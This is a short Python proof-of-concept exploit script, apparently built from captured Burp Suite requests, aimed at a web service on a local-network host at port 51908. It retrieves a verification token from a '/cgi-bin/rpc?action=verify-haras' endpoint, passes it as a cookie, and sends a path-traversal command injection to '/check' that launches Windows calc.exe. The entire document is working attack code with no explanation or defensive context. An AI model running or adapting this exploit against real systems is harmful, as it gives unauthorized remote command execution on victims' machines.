import requests
import json
session = requests.session()

burp0_url = "http://192.168.1.44:51908/cgi-bin/rpc?action=verify-haras"
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0"}
res = json.loads(session.get(burp0_url, headers=burp0_headers).text)
token = res.get('verify_string')
print("[*] Token get: {}".format(token))
burp0_url = "http://192.168.1.44:51908/check?cmd=ping../../../../../../../../../../../windows/system32/calc"
burp0_cookies = {"CID": token}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Cache-Control": "max-age=0"}
res = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
print(res.text)